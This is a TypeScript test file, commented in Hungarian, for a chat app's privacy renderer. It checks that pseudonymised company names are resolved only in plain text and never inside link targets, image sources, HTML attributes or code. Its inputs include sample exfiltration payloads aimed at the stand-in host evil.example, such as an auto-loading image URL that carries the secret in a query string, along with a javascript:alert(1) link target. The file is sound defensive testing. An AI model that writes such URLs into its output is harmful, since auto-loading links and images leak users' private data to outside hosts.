/**
 * APG-07 — renderelési biztonság: feloldás csak szöveg-node-ban (spec §10.3).
 *
 * Red-line: ha a modell az álnevet URL-be / kép-src-be / HTML-attribútumba /
 * kódba ágyazza, a naiv csere a nyers értéket aktív linkbe vagy auto-betöltő
 * képbe tenné. A feloldás ezekben a kontextusokban TILOS.
 *
 * Futtatás: npm run test:render-surrogate-resolve
 */
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import {
  isSafeMarkdownImageSrc,
  isSafeMarkdownLinkHref,
  unresolvedSurrogateHint,
} from '../src/lib/markdown-url-policy'
import { resolveDisplayText } from '../src/domain/privacy/resolve-display-text'
import { StreamingSurrogateResolver } from '../src/domain/privacy/streaming-surrogate-resolver'
import { containsEmbeddedSurrogate } from '../src/domain/privacy/surrogate-format'

let failures = 0
async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn()
    console.log(`  ✓ ${name}`)
  } catch (err) {
    failures += 1
    console.error(`  ✗ ${name}: ${err instanceof Error ? err.message : String(err)}`)
  }
}

const SUR = '[[COMPANY_1]]'
const lookup = async (surrogate: string) => (surrogate === SUR ? 'SPAR' : null)

async function collect(markdown: string, deltas?: string[]): Promise<string> {
  const emitted: string[] = []
  const resolver = new StreamingSurrogateResolver(lookup, (text) => {
    emitted.push(text)
  })
  for (const delta of deltas ?? [...markdown]) await resolver.push(delta)
  await resolver.finish()
  return emitted.join('')
}

async function main() {
  console.log('APG-07 renderelési biztonság (feloldás csak szöveg-node-ban)\n')

  await test('sima szöveg feloldódik', async () => {
    const out = await resolveDisplayText(`A ${SUR} forgalma.`, lookup)
    assert.equal(out, 'A SPAR forgalma.')
  })

  await test('nyers URL-ben az álnév feloldatlan marad', async () => {
    const src = `https://evil.example/?c=${SUR}`
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false, `nyers érték URL-ben: ${out}`)
    assert.equal(out.includes(SUR), true)
  })

  await test('markdown-link céljában az álnév feloldatlan marad', async () => {
    const src = `[lásd](https://evil.example/?c=${SUR})`
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false, `nyers érték a link-célban: ${out}`)
    assert.equal(out.includes(SUR), true)
    assert.equal(out, src)
  })

  await test('kép-src-ben az álnév feloldatlan marad', async () => {
    const src = `![x](https://evil.example/p.png?c=${SUR})`
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false, `nyers érték a kép-src-ben: ${out}`)
    assert.equal(out, src)
  })

  await test('HTML-attribútumban az álnév feloldatlan marad', async () => {
    const src = `<img src="https://evil.example/?c=${SUR}">`
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false, `nyers érték HTML-attribútumban: ${out}`)
    assert.equal(out, src)
  })

  await test('inline kódban az álnév feloldatlan marad', async () => {
    const src = `lásd \`${SUR}\` a kódban`
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false)
    assert.equal(out, src)
  })

  await test('kódblokkban az álnév feloldatlan marad', async () => {
    const src = '```\n' + SUR + '\n```'
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false)
    assert.equal(out, src)
  })

  await test('vegyes: szöveg feloldódik, link-cél nem', async () => {
    const out = await resolveDisplayText(
      `A ${SUR} és [x](https://evil.example/?c=${SUR}).`,
      lookup,
    )
    assert.equal(out, `A SPAR és [x](https://evil.example/?c=${SUR}).`)
  })

  await test('link-szöveg feloldódik, a cél nem', async () => {
    const out = await resolveDisplayText(`[cég: ${SUR}](https://ok.example/p)`, lookup)
    assert.equal(out, `[cég: SPAR](https://ok.example/p)`)
  })

  await test('HTML href attribútum feloldatlan (inline tag)', async () => {
    const src = `<a href="https://evil.example/?c=${SUR}">nézd</a>`
    const out = await resolveDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false)
    assert.equal(out.includes(SUR), true)
  })

  await test('streaming: a link-cél prefixe már kiment, a surrogate mégsem oldódik fel', async () => {
    const joined = await collect(`[lásd](https://evil.example/?c=${SUR})`)
    assert.equal(joined.includes('SPAR'), false, `streaming kiszivárgás: ${joined}`)
    assert.equal(joined.includes(SUR), true)
  })

  await test('streaming: sima szöveg karakterenként SPAR-ra oldódik', async () => {
    const joined = await collect(`A ${SUR} forgalma.`)
    assert.equal(joined, 'A SPAR forgalma.')
  })

  await test('lezáratlan link-cél finish-kor sem oldódik fel (fail-closed)', async () => {
    const joined = await collect(`[lásd](https://evil.example/?c=${SUR}`)
    assert.equal(joined.includes('SPAR'), false, `lezáratlan URL-be oldódott: ${joined}`)
  })

  await test('containsEmbeddedSurrogate: a UI a feloldatlan álnevet felismeri', () => {
    assert.equal(containsEmbeddedSurrogate(`https://evil.example/?c=${SUR}`), true)
    assert.equal(containsEmbeddedSurrogate('https://evil.example/?c=SPAR'), false)
    assert.equal(unresolvedSurrogateHint.length > 0, true)
  })

  await test('külső kép-src tilos (auto-betöltő beacon)', () => {
    assert.equal(isSafeMarkdownImageSrc('https://evil.example/x.png'), false)
    assert.equal(isSafeMarkdownImageSrc('http://evil.example/x.png'), false)
    assert.equal(isSafeMarkdownImageSrc('//evil.example/x.png'), false)
    assert.equal(isSafeMarkdownImageSrc('data:image/png;base64,aaa'), true)
    assert.equal(isSafeMarkdownImageSrc('/api/v1/conversations/1/workspace/files?path=a.png'), true)
  })

  await test('link-cél: javascript/data tilos, https megmarad', () => {
    assert.equal(isSafeMarkdownLinkHref('javascript:alert(1)'), false)
    assert.equal(isSafeMarkdownLinkHref('data:text/html,x'), false)
    assert.equal(isSafeMarkdownLinkHref('vbscript:x'), false)
    assert.equal(isSafeMarkdownLinkHref('https://example.com/p'), true)
    assert.equal(isSafeMarkdownLinkHref('/internal/path'), true)
  })

  await test('ChatMarkdown a közös URL-policy-t és a feloldatlan-jelzést használja', () => {
    const src = readFileSync(
      fileURLToPath(new URL('../src/components/chat/chat-markdown.tsx', import.meta.url)),
      'utf8',
    )
    assert.ok(src.includes('isSafeMarkdownImageSrc'), 'kép-src sanitizálás hiányzik')
    assert.ok(src.includes('isSafeMarkdownLinkHref'), 'link-cél sanitizálás hiányzik')
    assert.ok(src.includes('unresolvedSurrogateHint'), 'feloldatlan álnév jelzés hiányzik')
    assert.ok(src.includes('containsEmbeddedSurrogate'), 'álnév-felismerés hiányzik a UI-n')
  })

  console.log(
    failures === 0
      ? '\nMinden render-surrogate-resolve teszt zöld.'
      : `\n${failures} teszt elbukott.`,
  )
  process.exitCode = failures === 0 ? 0 : 1
}

main().catch((e) => {
  console.error(e)
  process.exitCode = 1
})
